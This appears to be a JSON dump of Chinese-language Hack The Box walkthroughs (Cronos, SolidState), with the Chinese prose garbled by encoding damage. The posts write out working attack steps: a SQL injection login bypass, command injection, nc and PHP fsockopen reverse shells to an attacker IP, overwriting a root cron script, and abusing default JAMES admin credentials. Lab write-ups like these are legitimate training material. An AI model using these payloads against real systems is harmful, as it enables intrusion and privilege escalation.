ååˆ¤æ–­åº”è¯¥æ˜¯å…³é”®å­—è¢«åˆ—å…¥é»‘åå•äº†\n\n```bash\n/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt\n```\næˆ‘ä»¬ä½¿ç”¨é€šé…ç¬¦ç»•è¿‡é»‘åå•\n\n```bash\ntom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                           \n<ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                                                                               \nUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWUoAy1l1eAsAAQQAAAAABAAAAACh3rCOvOQdB5V16DWzjmraL4LSDQyRE+gYobSHgwWoyN2auhvRchazKrlNmtBQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA\n```\nå†å»ä½¿ç”¨ä¹‹å‰è·å¾—çš„è§£å‹å¯†ç  magicword è¿›è¡Œè§£å‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# cat data    \nUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXLP2GJ1eAsAAQQAAAAABAAAAABxTsld158Zh1jLqaTlLhGh3omZpdVMsbbF4rimamhoJAz6zDqxvNxiE/AktcJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# base64 -d data > data_encode          \n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# file data_encode \ndata_encode: Zip archive data, at least v1.0 to extract, compression method=store\n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# unzip data_encode \nArchive:  data_encode\n[data_encode] root/root.txt password: \n extracting: root/root.txt           \n\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# cat root/root.txt \n1722e99ca5f353b362556a62bd5e6be0\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Cronos - Hackthebox","url":"/2022/07/14/Hackthebox/Medium/Hackthebox-Cronos/","content":"\n# Hackthebox - Cronos\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Cronos/67128da5-1ac4-44a6-a2de-c2db0f868ce1.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Cronos/c9796dd4-0ff5-449f-b3c1-2de36d4ed32f.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 09:52 CST\nWarning: 10.10.10.13 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.13\nHost is up (0.38s latency).\nNot shown: 65518 closed tcp ports (reset)\nPORT      STATE    SERVICE VERSION\n22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53/tcp    open     domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n11077/tcp filtered unknown\n16431/tcp filtered unknown\n23675/tcp filtered unknown\n23791/tcp filtered unknown\n24707/tcp filtered unknown\n28968/tcp filtered unknown\n30070/tcp filtered unknown\n33874/tcp filtered unknown\n36836/tcp filtered unknown\n37062/tcp filtered unknown\n41846/tcp filtered unknown\n42917/tcp filtered unknown\n45607/tcp filtered unknown\n51186/tcp filtered unknown\nAggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   368.17 ms 10.10.14.1\n2   468.12 ms 10.10.10.13\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 87.93 seconds\n```\n## Http\n![](Hackthebox-Cronos/d025b17e-55e9-473e-aa8a-5c3aa18a8669.png)\n\né»˜è®¤çš„ apache é¡µé¢ï¼Œfuzz é¡µé¢ä¹Ÿæ²¡æœ‰å¯ç”¨çš„ä¸œè¥¿ï¼Œå¯èƒ½åœ¨å­åŸŸå\n\n## å­åŸŸå\nåŠ ä¸€ä¸ª host è§£æ\n\n```bash\necho 10.10.10.13 cronos.htb >> /etc/hosts\n```\nç„¶åè·‘ä¸€ä¸ªå­åŸŸå\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ffuf -u 'http://cronos.htb/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host:FUZZ.cronos.htb' -fs 0,11439\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://cronos.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.cronos.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 0,11439\n________________________________________________\n\nadmin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5550ms]\nwww                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1331ms]\n```\n![](Hackthebox-Cronos/c14290bd-a94b-4907-af49-1fee44a80db5.png)\n\nfuzz å‡ºæœ‰ä¸€ä¸ª adminï¼Œç„¶åè¿™è¾¹æ˜¯åŠ ä¸Š host è§£æåï¼Œæœ‰äº†ä¸åŒçš„å˜åŒ–\n\næŠŠè§£æå‡ºæ¥çš„å­åŸŸåç»™åŠ ä¸ª hosts è§£æ\n\n```bash\necho 10.10.10.13 admin.cronos.htb >> /etc/hosts\n```\n![](Hackthebox-Cronos/aa9434e6-e52a-4061-a083-11b9720b32ec.png)\n\nè¿™è¾¹æœ‰ä¸€ä¸ªç™»é™†ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç \n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Cronos/dc7220e5-c315-42b4-ab1b-d849145c0e89.png)\n\næµ‹è¯•äº†ä¸€ä¸‹å­˜åœ¨ sql æ³¨å…¥ï¼Œå¯ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½•\n\n![](Hackthebox-Cronos/5e7fa2df-3927-4a0f-b8b7-31c992d700ad.png)\n\nç™»å…¥åæœ‰ä¸€ä¸ª traceroute å’Œ ping åŠŸèƒ½ï¼Œå’Œ DVWA ç›¸ä¼¼å•Šï¼Œåº”è¯¥æ˜¯å¯ä»¥æ‹¼æ¥ç›´æ¥æ‰§è¡Œå‘½ä»¤\n\n![](Hackthebox-Cronos/3e09e155-33cd-45c5-a035-cc220bd33f92.png)\n\nå»å°è¯•ä¸€ä¸‹æ˜¯å¦å¯æ‰§è¡Œ\n\n![](Hackthebox-Cronos/b141a31f-738d-4a56-ba8e-ef0d8c5add89.png)\n\nç¡®å®šå¯ä»¥æ‰§è¡Œå‘½ä»¤\n\nä½¿ç”¨ nc è¿›è¡Œç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n```bash\n127.0.0.1|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f\n```\nä½¿ç”¨å¦‚ä¸Šè¯­å¥æ¥è¿›è¡Œåå¼¹ shel\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 57784\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè·å¾—ä¸€ä¸ª shel\n\n```bash\nwww-data@cronos:/home/noulis$ cat user.txt\ncat user.txt\nacd300bee378d6a90aece189fc7ce7f6\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Cron jobs\nâ•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      \n/usr/bin/crontab                                                                                                                                                                                                                            \nincrontab Not Found\n-rw-r--r-- 1 root root     797 Apr  9  2017 /etc/crontab                                                                                                                                                                                    \n\n/etc/cron.d:\ntotal 24\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rw-r--r--  1 root root  589 Jul 16  2014 mdadm\n-rw-r--r--  1 root root  670 Mar  1  2016 php\n-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest\n\n/etc/cron.daily:\ntotal 60\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2\n-rwxr-xr-x  1 root root  376 Mar 31  2016 apport\n-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat\n-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils\n-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg\n-rwxr-xr-x  1 root root  372 May  6  2015 logrotate\n-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm\n-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate\n-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd\n-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest\n-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common\n\n/etc/cron.hourly:\ntotal 12\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n\n/etc/cron.monthly:\ntotal 12\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n\n/etc/cron.weekly:\ntotal 24\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim\n-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1\n```\nè¿™è¾¹çœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„ç¨‹åºè¿è¡Œåœ¨ root ä¸Š `/var/www/laravel/artisan` \n\n```bash\nwww-data@cronos:/var/www/laravel$ ls -la /var/www/laravel/artisan\nls -la /var/www/laravel/artisan\n-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan\n```\nè¿™è¾¹æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‹¥æœ‰å†™å…¥æƒé™ï¼Œçœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿\n\n```bash\nwww-data@cronos:/var/www/laravel$ cat artisan\ncat artisan\n#!/usr/bin/env php\n<?php\n\n/*\n|--------------------------------------------------------------------------\n| Register The Auto Loader\n|--------------------------------------------------------------------------\n|\n| Composer provides a convenient, automatically generated class loader\n| for our application. We just need to utilize it! We'll require it\n| into the script here so that we do not have to worry about the\n| loading of any our classes \"manually\". Feels great to relax.\n|\n*/\n\nrequire __DIR__.'/bootstrap/autoload.php';\n\n$app = require_once __DIR__.'/bootstrap/app.php';\n\n/*\n|--------------------------------------------------------------------------\n| Run The Artisan Application\n|--------------------------------------------------------------------------\n|\n| When we run the console application, the current CLI command will be\n| executed in this console and the response sent back to a terminal\n| or another output device for the developers. Here goes nothing!\n|\n*/\n\n$kernel = $app->make(Illuminate\\Contracts\\Console\\Kernel::class);\n\n$status = $kernel->handle(\n    $input = new Symfony\\Component\\Console\\Input\\ArgvInput,\n    new Symfony\\Component\\Console\\Output\\ConsoleOutput\n);\n\n/*\n|--------------------------------------------------------------------------\n| Shutdown The Application\n|--------------------------------------------------------------------------\n|\n| Once Artisan has finished running. We will fire off the shutdown events\n| so that any final work may be done by the application before we shut\n| down the process. This is the last thing to happen to the request.\n|\n*/\n\n$kernel->terminate($input, $status);\n\nexit($status);\n```\nä¼¼ä¹æ˜¯ä¸€ä¸ª php çš„è„šæœ¬ï¼Œå¹²å•¥çš„å’±å°±åˆ«ç®¡ä»–äº†ï¼Œå’±ä»¬å¯ä»¥å†™å…¥ä¸€ä¸ªç”¨ php åå¼¹ shell çš„è¯­å¥è¿›å»ï¼Œè¿›è¡Œåå¼¹\n\nå†å¼€ä¸ª nc è¿›è¡Œä¸€ä¸ªå…¶ä»–ç«¯å£çš„ç›‘å¬\n\n```bash\nnc -nvlp 5555\n```\n```bash\necho '<?php $sock=fsockopen(\"10.10.14.4\",5555);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>' > /var/www/laravel/artisan\n```\nç„¶åæ‰§è¡Œåï¼Œç­‰å¾…ä¸€ä¼šå„¿å°±è¡Œäº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 5555                                       \nlistening on [any] 5555 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 53042\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\n817402c7d13dc6ad8eff1f1af36d3382\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"SolidState - Hackthebox","url":"/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/","content":"\n# Hackthebox - SolidState\n# é¶åœºä¿¡æ¯\n![](Hackthebox-SolidState/4c71c978-a696-4953-a7f3-e15854c05553.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-SolidState/f951eea4-6c8a-44c6-85ad-b1aa4651162d.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:27 CST\nNmap scan report for 10.10.10.51\nHost is up (0.38s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)\n| ssh-hostkey: \n|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)\n|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)\n|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)\n25/tcp   open  smtp    JAMES smtpd 2.3.2\n|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.19 [10.10.14.19]), PIPELINING, ENHANCEDSTATUSCODES\n80/tcp   open  http    Apache httpd 2.4.25 ((Debian))\n|_http-title: Home - Solid State Security\n|_http-server-header: Apache/2.4.25 (Debian)\n110/tcp  open  pop3    JAMES pop3d 2.3.2\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n119/tcp  open  nntp?\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n4555/tcp open  rsip?\n| fingerprint-strings: \n|   GenericLines: \n|     JAMES Remote Administration Tool 2.3.2\n|     Please enter your login and password\n|     Login id:\n|     Password:\n|     Login failed for \n|_    Login id:\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port4555-TCP:V=7.92%I=7%D=7/11%Time=62CB7C97%P=aarch64-unknown-linux-gn\nSF:u%r(GenericLines,7C,\"JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\\nSF:.2\\nPlease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\n\nSF:Password:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=7/11%OT=22%CT=1%CU=39286%PV=Y%DS=2%DC=T%G=Y%TM=62CB7DA\nOS:6%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=3%ISR=10F%TI=Z%CI=I%TS=8)SE\nOS:Q(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10F%TI=Z\nOS:%II=I%TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11\nOS:NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71\nOS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4\nOS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O\nOS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40\nOS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q\nOS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y\nOS:%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   461.02 ms 10.10.14.1\n2   434.42 ms 10.10.10.51\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 304.88 seconds\n```\n## Http\n![](Hackthebox-SolidState/1890dda5-91e3-4ae1-a5d8-24dbc717743d.png)\n\nè¿™è¾¹æˆ‘ fuzz å’Œå¯»æ‰¾äº†ä¸€ä¸‹ï¼Œéƒ½æ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå’±ä»¬æ¢ä¸ªæ€è·¯\n\n## 4555 ç«¯å£\nè¿™è¾¹æœ‰ä¸€ä¸ª 4555 ç«¯å£ï¼Œè¿™ç§å¼‚å¸¸ç«¯å£ä¸€çœ‹å°±ä¸å¯¹åŠ²ã€‚JAMES Remote Administration Tool 2.3.2ï¼Œè¿™è¾¹æ‰«æç«¯å£çš„æ—¶å€™æœ‰æç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼Œå»æœç´¢ä¸€ä¸‹\n\n![](Hackthebox-SolidState/cbf1f061-20d1-4023-8a92-15bd5dcb782d.png)\n\n# æ¼æ´åˆ©ç”¨\nå¾—çŸ¥äº†è¿™æ˜¯ä¸€ä¸ª pop3 åè®®çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œé»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯ rootï¼Œå»ä½¿ç”¨ telnet ç™»é™†ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# telnet 10.10.10.51 4555\nTrying 10.10.10.51...\nConnected to 10.10.10.51.\nEscape character is '^]'.\nJAMES Remote Administration Tool 2.3.2\nPlease enter your login and password\nLogin id:\nroot\nPassword:\nroot\nWelcome root. HELP for a list of commands\nhelp\nCurrently implemented commands:\nhelp                                    display this help\nlistusers                               display existing accounts\ncountusers                              display the number of existing accounts\nadduser [username] [password]           add a new user\nverify [username]                       verify if specified user exist\ndeluser [username]                      delete existing user\nsetpassword [username] [password]       sets a user's password\nsetalias [user] [alias]                 locally forwards all email for 'user' to 'alias'\nshowalias [username]                    shows a user's current email alias\nunsetalias [user]                       unsets an alias for 'user'\nsetforwarding [username] [emailaddress] forwards a user's email to another email address\nshowforwarding [username]               shows a user's current email forwarding\nunsetforwarding [username]              removes a forward\nuser [repositoryname]                   change to another user repository\nshutdown                                kills the current JVM (convenient when James is run as a daemon)\nquit                                    close connection\n```\nç™»é™†æˆåŠŸï¼Œå‘½ä»¤ä¸­æœ‰åˆ—è´¦å·çš„åŠŸèƒ½å’Œé‡ç½®å¯†ç çš„åŠŸèƒ½ï¼Œå»çœ‹ä¸€ä¸‹\n\n```bash\nUnknown command \nlistusers\nExisting accounts 5\nuser: james\nuser: thomas\nuser: john\nuser: mindy\nuser: mailadmin\nsetpassword mindy admin\nPassword for mindy reset\n```\nå°†å¸æˆ· mindy çš„å¯†ç ç»™é‡ç½®äº†ï¼Œç„¶åå» 110 ç«¯å£ç™»é™†ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# telnet 10.10.10.51 110 \nTrying 10.10.10.51...\nConnected to 10.10.10.51.\nEscape character is '^]'.\n+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready \nuser mindy\n+OK\npass admin\n+OK Welcome mindy\nlist\n+OK 2 1945\n1 1109\n2 836\n.\nretr 2\n+OK Message follows\nReturn-Path: <mailadmin@localhost>\nMessage-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>\nMIME-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\nContent-Transfer-Encoding: 7bit\nDelivered-To: mindy@localhost\nReceived: from 192.168.11.142 ([192.168.11.142])\n          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581\n          for <mindy@localhost>;\n          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\nDate: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\nFrom: mailadmin@localhost\nSubject: Your Access\n\nDear Mindy,\n\nHere are your ssh credentials to access the system. Remember to reset your password after your first login. \nYour access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. \n\nusername: mindy\npass: P@55W0rd1!2@\n\nRespectfully,\nJames\n\n.\nConnection closed by foreign host.\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = mindy\npassword = P@55W0rd1!2@\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# ssh mindy@10.10.10.51           \nThe authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.\nED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.\nmindy@10.10.10.51's password: \nLinux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Aug 22 14:00:02 2017 from 192.168.11.142\nmindy@solidstate:~$ whoami&&id\n-rbash: whoami: command not found\n```\nè¿›å»äº†ï¼Œä½†æ²¡å®Œå…¨è¿›å»\n\n```bash\nmindy@solidstate:~$ cat user.txt\n80d14d9b351c71c448bd5500e43c222e\n```\nå¾—åˆ°äº† user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n## rbash é€ƒé€¸\n```bash\nmindy@solidstate:~$ cd\n-rbash: cd: restricted\n```\næ ¹æ®æƒ…å†µçœ‹ï¼Œè¿™æ˜¯ä¸€å°å—é™çš„ rbashï¼Œå»æƒ³åŠæ³•é€ƒé€¸ä¸€ä¸‹\n\n> [https://xz.aliyun.com/t/7642](https://xz.aliyun.com/t/7642)\n\næ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« \n\nä½¿ç”¨äº†å…¶ä¸­ä¸€ä¸ªæŒ‡å®š bash çš„æ–¹æ³•æˆåŠŸé€ƒé€¸\n\n```bash\nssh mindy@10.10.10.51 -t \"bash --noprofile\"\n```\næˆåŠŸé€ƒé€¸\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami&&id\nmindy\nuid=1001(mindy) gid=1001(mindy) groups=1001(mindy)\n```\n## Root\næŸ¥çœ‹ä¸€ä¸‹å½“å‰è¿è¡Œçš„è¿›ç¨‹\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux|grep james\nroot       556  0.0  0.0   2332   616 ?        Ss   Jul10   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh\nroot       575  0.1  3.7 854972 77232 ?        Sl   Jul10   0:19 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar\nmindy    23970  0.0  0.0   4736   800 pts/0    S+   02:15   0:00 grep james\n```\nå¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ª sh ä¸€ç›´è¿è¡Œç€çš„ run.sh æ–‡ä»¶å»æŸ¥çœ‹ä¸‹æ˜¯å•¥ä¸œè¥¿\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/james-2.3.2/bin/run.sh\n#! /bin/sh\n#\n# -----------------------------------------------------------------------------\n# 